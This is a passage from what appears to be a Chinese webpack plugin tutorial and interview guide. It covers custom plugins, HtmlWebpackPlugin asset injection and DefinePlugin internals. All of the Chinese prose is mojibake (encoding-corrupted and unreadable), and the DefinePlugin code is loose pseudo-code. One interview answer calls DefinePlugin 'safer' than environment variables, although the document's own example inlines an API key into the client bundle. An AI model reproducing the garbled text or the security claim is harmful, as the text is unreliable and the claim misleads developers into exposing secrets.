align="left">æä¾›ä½¿ç”¨è¯´æ˜</td><td align="left">åŒ…å«READMEå’Œç±»å‹å®šä¹‰</td></tr></tbody></table><p>(2) å®‰å…¨æ³¨æ„äº‹é¡¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafePlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;SafePlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 1. é¿å…ä¿®æ”¹åŸå§‹èµ„æº</span><br>      <span class="hljs-keyword">const</span> asset = compilation.<span class="hljs-property">assets</span>[<span class="hljs-string">&#x27;main.js&#x27;</span>];<br>      <span class="hljs-keyword">const</span> newSource = <span class="hljs-title function_">transform</span>(asset.<span class="hljs-title function_">source</span>()); <span class="hljs-comment">// åˆ›å»ºå‰¯æœ¬</span><br>      <br>      <span class="hljs-comment">// 2. æ·»åŠ æ–°èµ„æº</span><br>      compilation.<span class="hljs-property">assets</span>[<span class="hljs-string">&#x27;main-safe.js&#x27;</span>] = newSource;<br>      <br>      <span class="hljs-comment">// 3. é”™è¯¯å¤„ç†</span><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">riskyOperation</span>();<br>      &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        compilation.<span class="hljs-property">errors</span>.<span class="hljs-title function_">push</span>(err);<br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) Pluginä¸Loaderçš„åŒºåˆ«ï¼Ÿ</p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Loader</th><th align="left">Plugin</th></tr></thead><tbody><tr><td align="left">åŠŸèƒ½èŒƒå›´</td><td align="left">æ¨¡å—çº§åˆ«è½¬æ¢</td><td align="left">æ„å»ºæµç¨‹æ§åˆ¶</td></tr><tr><td align="left">è¿è¡Œæ—¶æœº</td><td align="left">æ¨¡å—åŠ è½½æ—¶</td><td align="left">æ•´ä¸ªæ„å»ºç”Ÿå‘½å‘¨æœŸ</td></tr><tr><td align="left">ä½¿ç”¨æ–¹å¼</td><td align="left">é…ç½®åœ¨module.rules</td><td align="left">é…ç½®åœ¨pluginsæ•°ç»„</td></tr><tr><td align="left">æ“ä½œå¯¹è±¡</td><td align="left">å•ä¸ªæ–‡ä»¶å†…å®¹</td><td align="left">Compiler&#x2F;Compilationå¯¹è±¡</td></tr><tr><td align="left">å…¸å‹åº”ç”¨</td><td align="left">ç¼–è¯‘JSXã€è½¬æ¢SCSS</td><td align="left">èµ„æºä¼˜åŒ–ã€ç¯å¢ƒæ³¨å…¥ã€æŠ¥å‘Šç”Ÿæˆ</td></tr></tbody></table><p>(2) å¦‚ä½•å®ç°èµ„æºå‹ç¼©æ’ä»¶ï¼Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MinifyPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;MinifyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(compilation.<span class="hljs-property">assets</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&#x27;.js&#x27;</span>)) &#123;<br>          <span class="hljs-keyword">const</span> source = compilation.<span class="hljs-property">assets</span>[name].<span class="hljs-title function_">source</span>();<br>          <span class="hljs-keyword">const</span> minified = <span class="hljs-title function_">minify</span>(source); <span class="hljs-comment">// å‹ç¼©å®ç°</span><br>          compilation.<span class="hljs-property">assets</span>[name] = &#123;<br>            <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> minified,<br>            <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> minified.<span class="hljs-property">length</span><br>          &#125;;<br>        &#125;<br>      &#125;);<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) å¦‚ä½•å¼€å‘å¯é…ç½®çš„æ’ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurablePlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = &#123;&#125;</span>) &#123;<br>    <span class="hljs-comment">// é»˜è®¤é…ç½®</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;<br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;report.html&#x27;</span>,<br>      <span class="hljs-attr">threshold</span>: <span class="hljs-number">100</span>,<br>      <span class="hljs-attr">include</span>: <span class="hljs-regexp">/\.js$/</span><br>    &#125;, options);<br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-comment">// ä½¿ç”¨this.optionsé…ç½®</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-å¸¸ç”¨æ’ä»¶åŸç†å‰–æï¼šHtmlWebpackPlugin-DefinePlugin"><a href="#2-2-3-å¸¸ç”¨æ’ä»¶åŸç†å‰–æï¼šHtmlWebpackPlugin-DefinePlugin" class="headerlink" title="2.2.3 å¸¸ç”¨æ’ä»¶åŸç†å‰–æï¼šHtmlWebpackPlugin &#x2F; DefinePlugin"></a>2.2.3 å¸¸ç”¨æ’ä»¶åŸç†å‰–æï¼š<code>HtmlWebpackPlugin</code> &#x2F; <code>DefinePlugin</code></h3><p><strong>HtmlWebpackPlugin æ·±åº¦è§£æ</strong></p><p>æ ¸å¿ƒåŠŸèƒ½æ¶æ„ï¼š</p><pre class="mermaid">graph TD  A[å…¥å£é…ç½®] --> B[è¯»å–æ¨¡æ¿]  B --> C[æ³¨å…¥èµ„æº]  C --> D[ä¼˜åŒ–HTML]  D --> E[ç”ŸæˆHTMLæ–‡ä»¶]    subgraph æ ¸å¿ƒå¤„ç†    C1[èµ„æºæ³¨å…¥] --> C2[Chunksæ˜ å°„]    C3[å˜é‡æ›¿æ¢] --> C4[æ¨¡æ¿æ¸²æŸ“]  end</pre><p>å·¥ä½œåŸç†æµç¨‹å›¾ï¼š</p><pre class="mermaid">sequenceDiagram  participant Webpack  participant HtmlWebpackPlugin  participant Compiler    Webpack->>Compiler: ç¼–è¯‘å¼€å§‹  Compiler->>HtmlWebpackPlugin: è§¦å‘compilationäº‹ä»¶  HtmlWebpackPlugin->>HtmlWebpackPlugin: åˆå§‹åŒ–æ¨¡æ¿  HtmlWebpackPlugin->>Compiler: è·å–èµ„æºæ¸…å•  HtmlWebpackPlugin->>HtmlWebpackPlugin: ç”ŸæˆHTMLå†…å®¹  HtmlWebpackPlugin->>Compiler: æ·»åŠ HTMLåˆ°èµ„æº  Compiler->>Webpack: è¾“å‡ºHTMLæ–‡ä»¶</pre><p><strong>HtmlWebpackPlugin æ ¸å¿ƒæœºåˆ¶</strong></p><p>(1) èµ„æºæ³¨å…¥åŸç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼ªä»£ç å®ç°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;HtmlWebpackPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation, callback</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 1. è·å–æ‰€æœ‰èµ„æºæ–‡ä»¶</span><br>      <span class="hljs-keyword">const</span> assets = compilation.<span class="hljs-title function_">getAssets</span>();<br>      <br>      <span class="hljs-comment">// 2. ç”Ÿæˆèµ„æºæ ‡ç­¾</span><br>      <span class="hljs-keyword">const</span> scripts = assets.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a.<span class="hljs-property">name</span>.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&#x27;.js&#x27;</span>))<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;a.name&#125;</span>&quot;&gt;&lt;/script&gt;`</span>);<br>      <br>      <span class="hljs-keyword">const</span> styles = assets.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a.<span class="hljs-property">name</span>.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&#x27;.css&#x27;</span>))<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> <span class="hljs-string">`&lt;link href=&quot;<span class="hljs-subst">$&#123;a.name&#125;</span>&quot; rel=&quot;stylesheet&quot;&gt;`</span>);<br>      <br>      <span class="hljs-comment">// 3. è¯»å–æ¨¡æ¿</span><br>      <span class="hljs-keyword">const</span> template = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;template.html&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>      <br>      <span class="hljs-comment">// 4. æ›¿æ¢å ä½ç¬¦</span><br>      <span class="hljs-keyword">const</span> html = template<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&lt;!-- scripts --&gt;&#x27;</span>, scripts.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&lt;!-- styles --&gt;&#x27;</span>, styles.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;\n&#x27;</span>));<br>      <br>      <span class="hljs-comment">// 5. æ·»åŠ åˆ°èµ„æºåˆ—è¡¨</span><br>      compilation.<span class="hljs-property">assets</span>[<span class="hljs-string">&#x27;index.html&#x27;</span>] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> html,<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> html.<span class="hljs-property">length</span><br>      &#125;;<br>      <br>      <span class="hljs-title function_">callback</span>();<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¤šé¡µé¢é…ç½®åŸç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€ç”Ÿæˆå¤šé¡µé¢é…ç½®</span><br><span class="hljs-keyword">const</span> pages = [<span class="hljs-string">&#x27;index&#x27;</span>, <span class="hljs-string">&#x27;about&#x27;</span>, <span class="hljs-string">&#x27;contact&#x27;</span>];<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: pages.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">page</span> =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>    <span class="hljs-attr">template</span>: <span class="hljs-string">`./src/<span class="hljs-subst">$&#123;page&#125;</span>.html`</span>,<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;page&#125;</span>.html`</span>,<br>    <span class="hljs-attr">chunks</span>: [<span class="hljs-string">`<span class="hljs-subst">$&#123;page&#125;</span>`</span>] <span class="hljs-comment">// ä»…æ³¨å…¥å½“å‰é¡µé¢chunk</span><br>  &#125;))<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>DefinePlugin æ·±åº¦è§£æ</strong></p><p>å·¥ä½œåŸç†ç¤ºæ„å›¾ï¼š</p><pre class="mermaid">graph LR  A[æºç ] --> B[DefinePluginå¤„ç†]  B --> C{å…¨å±€å¸¸é‡æ›¿æ¢}  C --> D[å¼€å‘ç¯å¢ƒå€¼]  C --> E[ç”Ÿäº§ç¯å¢ƒå€¼]  D --> F[å¤„ç†åçš„ä»£ç ]  E --> F</pre><p>æºç æ›¿æ¢è¿‡ç¨‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹ä»£ç </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Environment: &quot;</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;API Key: &quot;</span>, <span class="hljs-variable constant_">API_KEY</span>);<br><br><span class="hljs-comment">// ç»è¿‡DefinePluginå¤„ç†å</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Environment: &quot;</span>, <span class="hljs-string">&quot;development&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;API Key: &quot;</span>, <span class="hljs-string">&quot;abc123xyz&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>DefinePlugin æ ¸å¿ƒæœºåˆ¶</strong></p><p>(1) å®ç°åŸç†å‰–æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DefinePlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">definitions</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">definitions</span> = definitions;<br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">compilation</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;DefinePlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> &#123;<br>      compilation.<span class="hljs-property">hooks</span>.<span class="hljs-property">normalModuleLoader</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;DefinePlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">loaderContext, <span class="hljs-variable language_">module</span></span>) =&gt;</span> &#123;<br>        <span class="hljs-comment">// æ›¿æ¢æºä»£ç ä¸­çš„æ ‡è¯†ç¬¦</span><br>        <span class="hljs-variable language_">module</span>.<span class="hljs-property">source</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>          <span class="hljs-keyword">const</span> source = <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">originalSource</span>();<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">replaceIdentifiers</span>(source, <span class="hljs-variable language_">this</span>.<span class="hljs-property">definitions</span>);<br>        &#125;;<br>      &#125;);<br>    &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ ‡è¯†ç¬¦æ›¿æ¢å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">replaceIdentifiers</span>(<span class="hljs-params">source, definitions</span>) &#123;<br>  <span class="hljs-keyword">let</span> code = source.<span class="hljs-title function_">source</span>();<br>  <br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(definitions).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(definitions[key]);<br>    <span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">`\\b<span class="hljs-subst">$&#123;key&#125;</span>\\b`</span>, <span class="hljs-string">&#x27;g&#x27;</span>);<br>    code = code.<span class="hljs-title function_">replace</span>(regex, value);<br>  &#125;);<br>  <br>  <span class="hljs-keyword">return</span> code;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å®‰å…¨æ›¿æ¢ç­–ç•¥</p><table><thead><tr><th align="left">æ›¿æ¢æ–¹å¼</th><th align="left">ç¤ºä¾‹</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">ç›´æ¥æ–‡æœ¬æ›¿æ¢</td><td align="left"><code>API_KEY â†’ &quot;abc123&quot;</code></td><td align="left">ç®€å•é«˜æ•ˆ</td><td align="left">å¯èƒ½è¯¯æ›¿æ¢å˜é‡</td></tr><tr><td align="left">ä½œç”¨åŸŸæ„ŸçŸ¥æ›¿æ¢</td><td align="left"><code>process.env.NODE_ENV â†’ &quot;production&quot;</code></td><td align="left">å‡†ç¡®</td><td align="left">å®ç°å¤æ‚</td></tr><tr><td align="left">ASTçº§æ›¿æ¢</td><td align="left">è§£æåæ›¿æ¢æ ‡è¯†ç¬¦</td><td align="left">æœ€å®‰å…¨</td><td align="left">æ€§èƒ½å¼€é”€å¤§</td></tr></tbody></table><p><strong>ä¼ä¸šçº§åº”ç”¨åœºæ™¯</strong></p><p>(1) åŠ¨æ€é…ç½®HtmlWebpackPlugin</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒç”Ÿæˆä¸åŒé…ç½®</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>  <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;src/index.ejs&#x27;</span>,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;index.html&#x27;</span>,<br>  <span class="hljs-attr">minify</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span> ? &#123;<br>    <span class="hljs-attr">collapseWhitespace</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">removeComments</span>: <span class="hljs-literal">true</span><br>  &#125; : <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">meta</span>: &#123;<br>    <span class="hljs-string">&#x27;og:image&#x27;</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span> <br>      ? <span class="hljs-string">&#x27;https://prod.cdn.com/logo.png&#x27;</span><br>      : <span class="hljs-string">&#x27;https://dev.cdn.com/logo.png&#x27;</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) é«˜çº§DefinePluginé…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">DefinePlugin</span>(&#123;<br>  <span class="hljs-comment">// å®‰å…¨å­—ç¬¦ä¸²åŒ–</span><br>  <span class="hljs-attr">__DEV__</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> !== <span class="hljs-string">&#x27;production&#x27;</span>),<br>  <br>  <span class="hljs-comment">// è®¡ç®—å€¼</span><br>  <span class="hljs-attr">__BUILD_DATE__</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()),<br>  <br>  <span class="hljs-comment">// å¤æ‚å¯¹è±¡</span><br>  <span class="hljs-attr">__APP_CONFIG__</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>    <span class="hljs-attr">apiEndpoint</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">API_URL</span> || <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-attr">enableAnalytics</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span><br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) HtmlWebpackPlugin å¾ªç¯ä¾èµ–é—®é¢˜</p><p>ç—‡çŠ¶ï¼šError: Cyclic dependency</p><p>åŸå› ï¼šå¤šä¸ªHTMLæ¨¡æ¿ç›¸äº’å¼•ç”¨</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é…ç½®ç‹¬ç«‹chunks</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;pageA.html&#x27;</span>,<br>  <span class="hljs-attr">chunks</span>: [<span class="hljs-string">&#x27;pageA&#x27;</span>] <span class="hljs-comment">// ä»…åŒ…å«å½“å‰é¡µé¢chunk</span><br>&#125;)<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;pageB.html&#x27;</span>,<br>  <span class="hljs-attr">chunks</span>: [<span class="hljs-string">&#x27;pageB&#x27;</span>] <span class="hljs-comment">// ä¸åŒ…å«pageAçš„chunk</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>(2) DefinePlugin æ›¿æ¢ä¸ç”Ÿæ•ˆ</p><p>è¯Šæ–­æ­¥éª¤ï¼š</p><ul><li>æ£€æŸ¥å˜é‡åæ˜¯å¦å®Œå…¨åŒ¹é…</li><li>ç¡®è®¤æ˜¯å¦è¢«å…¶ä»–æ’ä»¶è¦†ç›–</li><li>éªŒè¯ç¯å¢ƒå˜é‡æ˜¯å¦ä¼ é€’æ­£ç¡®</li><li>ä½¿ç”¨<code>console.log(__VARIABLE__)</code>è°ƒè¯•</li></ul><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) HtmlWebpackPluginå¦‚ä½•å®ç°å¤šé¡µé¢æ”¯æŒï¼Ÿ</p><p>å®ç°åŸç†ï¼š</p><ul><li>æ ¹æ®é…ç½®åˆ›å»ºå¤šä¸ªå®ä¾‹</li><li>æ¯ä¸ªå®ä¾‹ç®¡ç†ç‹¬ç«‹å…¥å£</li><li>é€šè¿‡chunksé€‰é¡¹æ§åˆ¶èµ„æºæ³¨å…¥</li><li>å…±äº«æ¨¡æ¿å¼•æ“ä½†éš”ç¦»æ•°æ®</li></ul><p>(2) DefinePluginä¸ºä»€ä¹ˆæ¯”ç¯å¢ƒå˜é‡æ›´å®‰å…¨ï¼Ÿ</p><p>å®‰å…¨ä¼˜åŠ¿ï¼š</p><ol><li>ç¼–è¯‘æ—¶æ›¿æ¢ï¼šä¸æš´éœ²åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­</li><li>å€¼ä¼˜åŒ–ï¼šç›´æ¥æ›¿æ¢ä¸ºå­—é¢é‡ï¼ˆå¦‚trueè€Œéå­—ç¬¦ä¸²â€trueâ€ï¼‰</li><li>ä½œç”¨åŸŸé™å®šï¼šåªæ›¿æ¢æºä»£ç ä¸­ç²¾ç¡®åŒ¹é…çš„æ ‡è¯†ç¬¦</li><li>ä¸å¯å˜ï¼šæ›¿æ¢åæ— æ³•åœ¨è¿è¡Œæ—¶ä¿®æ”¹</li></ol><p>(3) å¦‚ä½•è‡ªå®šä¹‰HtmlWebpackPluginçš„æ¨¡æ¿ï¼Ÿ</p><p>å®ç°æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. ä½¿ç”¨EJSæ¨¡æ¿å¼•æ“</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>  <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;src/index.ejs&#x27;</span>,<br>  <span class="hljs-attr">templateParameters</span>: &#123;<br>    <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;è‡ªå®šä¹‰æ ‡é¢˜&#x27;</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 2. æ¨¡æ¿å†…å®¹ç¤ºä¾‹ --&gt;<br>&lt;!-- src/index.ejs --&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;<br>  &lt;%= htmlWebpackPlugin.tags.headTags 